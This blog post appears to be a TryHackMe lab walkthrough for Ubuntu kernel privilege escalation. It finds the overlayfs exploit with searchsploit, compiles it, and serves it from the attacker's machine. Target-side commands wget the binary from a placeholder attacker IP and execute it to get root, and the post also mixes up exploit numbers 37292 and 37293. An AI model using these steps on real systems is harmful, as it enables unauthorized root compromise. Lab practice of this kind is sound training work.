---
title: "Linux Priviledge Escallation room"
excerpt: "exploiting an obuntu kernel vulnerability, exploiting it on target to root"
date: 2025-08-03
tags: [exploits, ssh, ecalation, searchsploit]
layout: single
author_profile: true
---
### Exploiting obuntu kernel vulnerability
Start kali and connect to your tryhackme room using **sudo openvpn Lugadilu.ovpn**

To connect to target ssh, run the username ssh karen@<Target IP> then insert the password as given in the room ie ssh karen@10.10.230.146

![Topography Image](/assets/images/ssh.png)

after connecting to target, verify the OS and kernel Version ny running **uname -a** you get an output stating linux target 3.13.0-24-generic. 
The vulnerability is >>3.13.0-24**

### Kernel Exploit Search

Open a new terminal in your Kali and search for privilege escalation exploits related to the above kernel i.e **searchsploit ubuntu 14.04**
 You identify this exploit in the table **Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04 | linux/local/37292.c**
![Topography Image](/assets/images/searchsploit.png)

 copy it locally ie **searchsploit -m linux/local/37293.c**

 ### Compile the exploit on kali (attacker machine)
 Run **gcc 37292.c -o overlayfs-exploit -Wall** and verify by running **file overlayfs-exploit**

 ### Host Exploit on local web server
 still in your attacker kali, run HTTP server to serve the exploit i e **python3 -m http.server 8000**
 ![Topography Image](/assets/images/gccport.png)

 ### Transfer the exploit to target machine
 Firs confirm your kali Ip by running ifconfig and taking tun0 and not eth(local lan) ip since we are connected to tryhackme using vpn

swith to the target machine that we are running ssh and run the following sunsequently
**cd /dev/shm**
**wget http://<KALI_TUN0_IP>:8000/overlayfs-exploit -O exploit**
**chmod +x exploit**
**./exploit** -exloring for root access

Through this, you may het a GLIBC version error like i got when i did run ./exploit, this means the binary you compiled on kali is incomp
atible with the older system on the target. To fix this, compile on the target itself by running the following
**cd /tmp**
**wget http://<KALI_TUN0_IP>:8000/37292.c -O exploit.c**
**gcc exploit.c -o exploit**
**chmod +x exploit**

Exlore for root access by running **./exploit**
And now kudos!! you are the root. Verify this by running **whoami**

### Retrieving the flag
Locate and read  the flag by running 
**find / -name flag1.txt 2>/dev/null**
/home/matt/flag1.txt

**cat /home/matt/flag1.txt**
![Topography Image](/assets/images/root.png)




